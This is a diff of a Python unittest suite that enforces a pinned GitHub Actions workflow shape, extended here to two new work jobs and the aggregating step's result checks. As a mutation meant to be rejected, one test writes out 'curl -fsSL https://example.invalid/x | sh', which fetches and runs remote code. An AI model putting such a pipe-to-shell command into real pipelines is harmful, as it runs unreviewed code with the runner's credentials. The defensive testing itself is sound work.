@@ -49,7 +49,7 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_runtime_helper_is_pinned_in_every_install_job(self):
         for filename, jobs, command in (
-            ('symbolic-check.yml', ('check-root', 'check-consumers-db', 'check-consumers'),
+            ('symbolic-check.yml', ('check-root', 'check-root-b', 'check-aggregate', 'check-consumers-db', 'check-consumers'),
              'sudo python3 scripts/ci-install-runtime.py'),
             ('symbolic-gleam.yml', ('gleam-hosted',),
              'sudo python3 "$GITHUB_WORKSPACE/scripts/ci-install-runtime.py"'),
@@ -170,7 +170,7 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_extra_backend_job_header_rejected_independently(self):
         self.add_job_header_without_selector("symbolic-check.yml")
-        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
 
     def test_extra_gleam_job_header_rejected_independently(self):
         self.add_job_header_without_selector("symbolic-gleam.yml")
@@ -510,8 +510,8 @@ class RunnerPolicyTest(unittest.TestCase):
         source = self.source()
         self.assertEqual(1, source.count(self.DECISION))
         self.assertEqual(1, source.count(self.ANY_PERMS))
-        self.assertEqual(5, source.count("github.token"))  # the decision step and the S3 test server step of each work job and of check-piece
-        self.assertEqual(7, source.count("permissions:"))  # top level and the six jobs
+        self.assertEqual(7, source.count("github.token"))  # the decision step and the S3 test server step of each work job and of check-piece
+        self.assertEqual(9, source.count("permissions:"))  # top level and the eight jobs
         self.check(0)
 
     def test_write_permissions_rejected(self):
@@ -585,7 +585,7 @@ class RunnerPolicyTest(unittest.TestCase):
                 self.setUp()
 
     def test_run_mix_check_condition_is_pinned(self):
-        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
+        for job, part in (("check-root", "root-a"), ("check-root-b", "root-b"), ("check-aggregate", "aggregate"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
             step = f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part}\n"
             for new in (f"      - name: Run mix check\n        if: ${{{{ false }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n",
                         f"      - name: Run mix check\n        if: ${{{{ always() }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n",
@@ -604,7 +604,8 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_each_work_job_runs_its_own_part_and_no_other(self):
         # Swapping the parts of two jobs would run a part twice and another never: the step is pinned per job.
-        parts = {"check-root": "root", "check-consumers-db": "consumers-db", "check-consumers": "consumers"}
+        parts = {"check-root": "root-a", "check-root-b": "root-b", "check-aggregate": "aggregate",
+                 "check-consumers-db": "consumers-db", "check-consumers": "consumers"}
         for job, part in parts.items():
             for other in parts.values():
                 if other == part:
@@ -616,7 +617,7 @@ class RunnerPolicyTest(unittest.TestCase):
                     self.setUp()
 
     def test_run_mix_check_step_cannot_be_removed_from_a_work_job(self):
-        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
+        for job, part in (("check-root", "root-a"), ("check-root-b", "root-b"), ("check-aggregate", "aggregate"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, f"      - name: Run mix check\n        run: sh scripts/run-ci-check.sh --part {part}\n", "")
                 self.assertIn(f"the pinned step \"name: Run mix check\" is missing or changed ({job})", self.check(1).stderr)
@@ -657,8 +658,8 @@ class RunnerPolicyTest(unittest.TestCase):
 """
 
     def test_checkout_must_not_persist_the_token(self):
-        self.assertEqual(5, self.source().count(self.CHECKOUT))     # check-plan, the three work jobs and check-piece
-        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers", "check-piece"):
+        self.assertEqual(7, self.source().count(self.CHECKOUT))     # check-plan, the five work jobs and check-piece
+        for job in ("check-plan", "check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers", "check-piece"):
             for new in (self.CHECKOUT.replace("          persist-credentials: false\n", ""),
                         self.CHECKOUT.replace("persist-credentials: false", "persist-credentials: true"),
                         self.CHECKOUT.replace("fetch-depth: 0", "fetch-depth: 1"),
@@ -678,7 +679,7 @@ class RunnerPolicyTest(unittest.TestCase):
         self.assertIn("must not check out the repository (check-hosted)", self.check(1).stderr)
 
     def test_checkout_without_persist_credentials_false_rejected(self):
-        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers"):
+        for job in ("check-plan", "check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers"):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, "          persist-credentials: false\n", "")
                 self.assertIn(f"the pinned checkout step (persist-credentials: false) is missing or changed ({job})", self.check(1).stderr)
@@ -811,7 +812,7 @@ class RunnerPolicyTest(unittest.TestCase):
         path = self.root / ".github" / "workflows" / "symbolic-check.yml"
         source = path.read_text()
         path.write_text(source[:source.index("\n  check-hosted:\n")] + "\n")
-        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
         self.tearDown()
         self.setUp()
         path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
@@ -820,7 +821,7 @@ class RunnerPolicyTest(unittest.TestCase):
         self.assertIn("exactly one gleam-hosted job is required", self.check(1).stderr)
 
     def test_hosted_backend_token_is_limited_to_the_pinned_steps(self):
-        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
+        for job, part in (("check-root", "root-a"), ("check-root-b", "root-b"), ("check-aggregate", "aggregate"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, f"        run: sh scripts/run-ci-check.sh --part {part}\n",
                                    f"        env:\n          GITHUB_TOKEN: ${{{{ github.token }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n")
@@ -848,7 +849,7 @@ class RunnerPolicyTest(unittest.TestCase):
         self.assertIn("the pinned checkout step (persist-credentials: false) is missing or changed (check-plan)", self.check(1).stderr)
 
     def test_s3_test_server_steps_are_pinned(self):
-        for job in ("check-root", "check-consumers-db", "check-consumers"):
+        for job in ("check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers"):
             for old, new in (("        run: python3 scripts/ci-minio.py\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
                              ("        id: minio\n", "        id: other\n"),
                              ("          GITHUB_TOKEN: ${{ github.token }}\n        run: python3 scripts/ci-minio.py\n",
@@ -907,7 +908,8 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_a_part_marker_is_never_printed_by_the_workflow(self):
         for job in self.BACKEND_JOB_NAMES:
-            for marker in ("ELZOO ROOT SUITE PASSED", "ELZOO CONSUMERS DB PASSED", "ELZOO CONSUMERS PASSED"):
+            for marker in ("ELZOO ROOT SUITE PASSED", "ELZOO ROOT A SUITE PASSED", "ELZOO ROOT B SUITE PASSED",
+                           "ELZOO AGGREGATE CONSUMER PASSED", "ELZOO CONSUMERS DB PASSED", "ELZOO CONSUMERS PASSED"):
                 with self.subTest(job=job, marker=marker):
                     step = f"      - run: echo \"{marker}\"\n"
                     anchor = "      - name: Require every job\n" if job == "check-hosted" else "      - uses: actions/checkout@"
@@ -922,7 +924,7 @@ class RunnerPolicyTest(unittest.TestCase):
         # Review of PR #144, note 2: the end of a pinned step is part of the pin.
         # ELZ-078: each case names the pinned step it must break, with the job.
         for job, pinned, step, extra in (
-                ("check-root", "name: Run mix check", "        run: sh scripts/run-ci-check.sh --part root\n", "        env:\n          X: y\n"),
+                ("check-root", "name: Run mix check", "        run: sh scripts/run-ci-check.sh --part root-a\n", "        env:\n          X: y\n"),
                 ("check-consumers", "name: Run mix check", "        run: sh scripts/run-ci-check.sh --part consumers\n", "        timeout-minutes: 1\n"),
                 ("check-hosted", "name: Require every job", "            test \"$CONSUMERS\" = skipped\n          fi\n", "        timeout-minutes: 1\n"),
                 # (this case also prints the message of the `continue-on-error:` check; the assertion names the pin)
@@ -952,7 +954,7 @@ class RunnerPolicyTest(unittest.TestCase):
         self.assertIn("the pinned S3 test server steps are missing or changed (check-root)", self.check(1).stderr)
 
     def test_s3_test_server_steps_cannot_be_removed(self):
-        for job in ("check-root", "check-consumers-db", "check-consumers"):
+        for job in ("check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers"):
             with self.subTest(job=job):
                 path = self.root / ".github" / "workflows" / "symbolic-check.yml"
                 source = path.read_text()
@@ -1029,7 +1031,7 @@ class RunnerPolicyTest(unittest.TestCase):
     # ELZ-069: the self-hosted lane is gone; nothing of it may come back silently.
     def test_jobs_must_keep_their_names(self):
         self.change("symbolic-check.yml", "  check-hosted:\n", "  check-renamed:\n")
-        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
+        self.assertIn("exactly the jobs check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order", self.check(1).stderr)
         self.tearDown()
         self.setUp()
         self.change("symbolic-gleam.yml", "  gleam-hosted:\n", "  gleam:\n")
@@ -1183,8 +1185,8 @@ class RunnerPolicyTest(unittest.TestCase):
                     '      - run: echo "ELZOO DOCS-ONLY CHECK PASSED"\n      - name: Report container resource observations\n')
         self.assertTrue(self.check(1).stderr)
 
-    WORK_JOB_NAMES = ("check-root", "check-consumers-db", "check-consumers")
-    BACKEND_JOB_NAMES = ("check-plan", "check-root", "check-consumers-db", "check-consumers", "check-piece", "check-hosted")
+    WORK_JOB_NAMES = ("check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers")
+    BACKEND_JOB_NAMES = ("check-plan", "check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers", "check-piece", "check-hosted")
     WORK_HEAD = "    if: ${{ needs.check-plan.outputs.run == 'true' }}\n    needs: check-plan\n"
 
     def test_every_work_job_waits_for_the_plan(self):
@@ -1216,21 +1218,21 @@ class RunnerPolicyTest(unittest.TestCase):
         following = [i for i in (source.find("\n  check-", start + 1), source.find("\n  gleam", start + 1)) if i != -1]
         return source[start:min(following) + 1 if following else len(source)]
 
-    def test_the_five_backend_jobs_are_required_in_order(self):
+    def test_the_eight_backend_jobs_are_required_in_order(self):
         source = self.source()
         for job in self.BACKEND_JOB_NAMES:
             with self.subTest(removed=job):
                 text = self.job_text(job)
                 path = self.root / ".github" / "workflows" / "symbolic-check.yml"
                 path.write_text(source.replace(text, "", 1))
-                self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order",
+                self.assertIn("exactly the jobs check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece, check-hosted are required, in this order",
                               self.check(1).stderr)
                 self.tearDown()
                 self.setUp()
         # Two jobs swapped: the order is part of the reviewed shape.
-        root, db = self.job_text("check-root"), self.job_text("check-consumers-db")
+        root, root_b = self.job_text("check-root"), self.job_text("check-root-b")
         path = self.root / ".github" / "workflows" / "symbolic-check.yml"
-        path.write_text(source.replace(root + db, db + root, 1))
+        path.write_text(source.replace(root + root_b, root_b + root, 1))
         self.assertIn("in this order", self.check(1).stderr)
 
     def test_every_backend_job_keeps_the_identity_gate_first(self):
@@ -1280,9 +1282,9 @@ class RunnerPolicyTest(unittest.TestCase):
         gate = "    if: ${{ always() && (github.event_name == 'push'"
         for old, new in ((gate, "    if: ${{ (github.event_name == 'push'"),                                     # no always()
                          (gate, "    if: ${{ !cancelled() && (github.event_name == 'push'"),
-                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers, check-piece]\n", "    needs: [check-plan, check-root, check-consumers-db]\n"),
-                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers, check-piece]\n", "    needs: [check-root, check-consumers-db, check-consumers]\n"),
-                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers, check-piece]\n", "    needs: check-plan\n"),
+                         ("    needs: [check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece]\n", "    needs: [check-plan, check-root, check-root-b, check-aggregate, check-consumers-db]\n"),
+                         ("    needs: [check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece]\n", "    needs: [check-root, check-consumers-db, check-consumers]\n"),
+                         ("    needs: [check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece]\n", "    needs: check-plan\n"),
                          ("          test \"$PLAN\" = success\n", ""),
                          ("            test \"$ROOT\" = success\n", ""),
                          ("            test \"$DB\" = success\n", ""),
@@ -1306,7 +1308,7 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_the_full_check_marker_is_printed_by_the_aggregating_job_only(self):
         self.assertEqual(1, self.source().count("ELZOO CHECK PASSED"))
-        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers"):
+        for job in ("check-plan", "check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers"):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                    "      - run: echo \"ELZOO CHECK PASSED\"\n      - name: Verify the GitHub-hosted runner\n")
@@ -1318,7 +1320,7 @@ class RunnerPolicyTest(unittest.TestCase):
         self.assertIn("the full-check marker may be printed by the pinned aggregating step only (check-hosted)", self.check(1).stderr)
 
     def test_the_docs_only_marker_is_printed_by_the_plan_job_only(self):
-        for job in ("check-root", "check-consumers-db", "check-consumers", "check-hosted"):
+        for job in ("check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers", "check-hosted"):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                    "      - run: echo \"ELZOO DOCS-ONLY CHECK PASSED\"\n      - name: Verify the GitHub-hosted runner\n")
@@ -1388,7 +1390,7 @@ class RunnerPolicyTest(unittest.TestCase):
                 self.setUp()
 
     def test_no_other_job_runs_the_small_gate(self):
-        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers", "check-hosted"):
+        for job in ("check-plan", "check-root", "check-root-b", "check-aggregate", "check-consumers-db", "check-consumers", "check-hosted"):
             with self.subTest(job=job):
                 self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                    self.PIECE_STEP + "      - name: Verify the GitHub-hosted runner\n")
@@ -1433,7 +1435,7 @@ class RunnerPolicyTest(unittest.TestCase):
                 self.setUp()
 
     def test_the_aggregating_job_needs_the_piece_job_and_checks_its_result(self):
-        needs = "    needs: [check-plan, check-root, check-consumers-db, check-consumers, check-piece]\n"
+        needs = "    needs: [check-plan, check-root, check-root-b, check-aggregate, check-consumers-db, check-consumers, check-piece]\n"
         for old, new in ((needs, needs.replace(", check-piece]", "]")),
                          ("          SMALL: ${{ needs.check-piece.result }}\n", "          SMALL: success\n"),
                          ("          PIECE: ${{ needs.check-plan.outputs.piece }}\n", "          PIECE: false\n"),
@@ -1489,28 +1491,42 @@ class RunnerPolicyTest(unittest.TestCase):
 
     def test_the_aggregating_step_accepts_exactly_three_shapes(self):
         script = self.step_script("check-hosted", "Require every job")
-        good = [("true", "false", "success", "success", "success", "skipped"),    # full
-                ("false", "true", "skipped", "skipped", "skipped", "success"),    # small gate
-                ("false", "false", "skipped", "skipped", "skipped", "skipped")]   # docs-only or a logged skip
-        bad = [("true", "false", "success", "success", "success", "success"),
-               ("true", "true", "success", "success", "success", "skipped"),
-               ("false", "true", "success", "skipped", "skipped", "success"),
-               ("false", "true", "skipped", "skipped", "skipped", "skipped"),
-               ("false", "true", "skipped", "skipped", "skipped", "failure"),
-               ("false", "true", "skipped", "skipped", "skipped", "cancelled"),
-               ("false", "false", "skipped", "skipped", "skipped", "success"),
-               ("false", "", "skipped", "skipped", "skipped", "skipped"),
-               ("", "true", "skipped", "skipped", "skipped", "success")]
+        good = [("true", "false", "success", "success", "success", "success", "success", "skipped"),    # full
+                ("false", "true", "skipped", "skipped", "skipped", "skipped", "skipped", "success"),    # small gate
+                ("false", "false", "skipped", "skipped", "skipped", "skipped", "skipped", "skipped")]   # docs-only or a logged skip
+        bad = [("true", "false", "success", "success", "success", "success", "success", "success"),
+               ("true", "true", "success", "success", "success", "success", "success", "skipped"),
+               ("false", "true", "success", "skipped", "skipped", "skipped", "skipped", "success"),
+               ("false", "true", "skipped", "skipped", "skipped", "skipped", "skipped", "skipped"),
+               ("false", "true", "skipped", "skipped", "skipped", "skipped", "skipped", "failure"),
+               ("false", "true", "skipped", "skipped", "skipped", "skipped", "skipped", "cancelled"),
+               ("false", "false", "skipped", "skipped", "skipped", "skipped", "skipped", "success"),
+               ("false", "", "skipped", "skipped", "skipped", "skipped", "skipped", "skipped"),
+               ("", "true", "skipped", "skipped", "skipped", "skipped", "skipped", "success")]
         for shape, code in [(g, 0) for g in good] + [(b, 1) for b in bad]:
-            run, piece, root, db, consumers, small = shape
+            run, piece, root, root_b, aggregate, db, consumers, small = shape
             with self.subTest(shape=shape):
                 result, _ = self.run_script(script, {"PLAN": "success", "RUN": run, "PIECE": piece, "ROOT": root,
-                                                     "DB": db, "CONSUMERS": consumers, "SMALL": small})
+                                                     "ROOT_B": root_b, "AGGREGATE": aggregate, "DB": db,
+                                                     "CONSUMERS": consumers, "SMALL": small})
                 self.assertEqual(code, 0 if result.returncode == 0 else 1, result.stdout + result.stderr)
                 self.assertEqual(shape == good[0], "ELZOO CHECK PASSED" in result.stdout)
         result, _ = self.run_script(script, {"PLAN": "failure", "RUN": "false", "PIECE": "true", "ROOT": "skipped",
-                                             "DB": "skipped", "CONSUMERS": "skipped", "SMALL": "success"})
+                                             "ROOT_B": "skipped", "AGGREGATE": "skipped", "DB": "skipped",
+                                             "CONSUMERS": "skipped", "SMALL": "success"})
         self.assertNotEqual(0, result.returncode)
+
+        # Every work result matters in each shape, including both new jobs and missing results.
+        for run, piece, root, root_b, aggregate, db, consumers, small in good:
+            env = dict(PLAN="success", RUN=run, PIECE=piece, ROOT=root, ROOT_B=root_b,
+                       AGGREGATE=aggregate, DB=db, CONSUMERS=consumers, SMALL=small)
+            for job in ("ROOT", "ROOT_B", "AGGREGATE", "DB", "CONSUMERS"):
+                for value in ("", "success", "skipped", "failure", "cancelled"):
+                    if value != env[job]:
+                        with self.subTest(run=run, piece=piece, job=job, value=value):
+                            result, _ = self.run_script(script, {**env, job: value})
+                            self.assertNotEqual(0, result.returncode)
+                            self.assertNotIn("ELZOO CHECK PASSED", result.stdout)
 
 
 if __name__ == "__main__":
